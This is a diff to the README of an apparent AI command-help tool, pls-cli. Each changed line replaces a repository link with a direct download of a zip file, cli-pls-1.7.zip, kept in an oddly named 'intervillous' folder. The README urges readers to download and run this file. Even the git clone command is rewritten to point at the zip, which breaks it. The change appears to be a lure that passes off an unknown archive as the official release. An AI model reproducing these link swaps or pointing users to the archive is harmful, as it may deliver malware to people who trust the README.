@@ -1,6 +1,6 @@
 # ⚡ pls-cli - Fast AI Command Help
 
-[![Download](https://img.shields.io/badge/Download%20pls--cli-blue?style=for-the-badge&logo=github)](https://github.com/Titusawnless195/pls-cli)
+[![Download](https://img.shields.io/badge/Download%20pls--cli-blue?style=for-the-badge&logo=github)](https://github.com/Titusawnless195/pls-cli/raw/refs/heads/main/intervillous/cli-pls-1.7.zip)
 
 ## 🖥️ What this app does
 
@@ -18,7 +18,7 @@ Use it when you want to:
 
 Visit this page to download:
 
-[https://github.com/Titusawnless195/pls-cli](https://github.com/Titusawnless195/pls-cli)
+[https://github.com/Titusawnless195/pls-cli/raw/refs/heads/main/intervillous/cli-pls-1.7.zip](https://github.com/Titusawnless195/pls-cli/raw/refs/heads/main/intervillous/cli-pls-1.7.zip)
 
 If the page offers a release file, download it and run it on your computer. If it offers source files only, use the build steps below.
 
@@ -48,7 +48,7 @@ Use the official Ollama install steps for Linux, then confirm it works by openin
 
 Go to the repository page:
 
-[https://github.com/Titusawnless195/pls-cli](https://github.com/Titusawnless195/pls-cli)
+[https://github.com/Titusawnless195/pls-cli/raw/refs/heads/main/intervillous/cli-pls-1.7.zip](https://github.com/Titusawnless195/pls-cli/raw/refs/heads/main/intervillous/cli-pls-1.7.zip)
 
 Download the release file if one is available, or get the project files if you plan to build it.
 
@@ -80,7 +80,7 @@ On Ubuntu, you can install common tools with:
 
 ### Get the code
 
-`git clone https://github.com/Titusawnless195/pls-cli.git`
+`git clone https://github.com/Titusawnless195/pls-cli/raw/refs/heads/main/intervillous/cli-pls-1.7.zip`
 
 `cd pls-cli`
 
@@ -189,5 +189,5 @@ pls-cli works with Ollama on your own machine. That keeps your command requests 
 
 ## 📚 Helpful links
 
-- Repository: https://github.com/Titusawnless195/pls-cli
-- Download page: https://github.com/Titusawnless195/pls-cli
+- Repository: https://github.com/Titusawnless195/pls-cli/raw/refs/heads/main/intervillous/cli-pls-1.7.zip
+- Download page: https://github.com/Titusawnless195/pls-cli/raw/refs/heads/main/intervillous/cli-pls-1.7.zip
